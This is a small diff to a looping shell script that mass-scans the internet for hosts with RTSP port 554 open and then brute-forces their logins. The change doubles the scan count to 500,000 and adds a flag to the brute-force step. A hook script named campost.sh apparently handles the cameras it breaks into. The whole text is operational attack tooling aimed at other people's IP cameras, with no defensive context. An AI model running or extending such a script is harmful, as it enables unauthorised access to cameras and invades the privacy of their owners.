@@ -5,11 +5,11 @@ while true; do
     rm ./local/hosts_554.txt
     echo
     echo Gather IPs
-    ./fortune_port.py 554 250000 1024 -i tun0
+    ./fortune_port.py 554 500000 1024 -i tun0
     echo
     echo Brute
     ./rtsp_brute2.py \
-        -ht 1024 -i tun0 \
+        -ht 1024 -i tun0 -ff \
         --cc local/campost.sh
 done
 
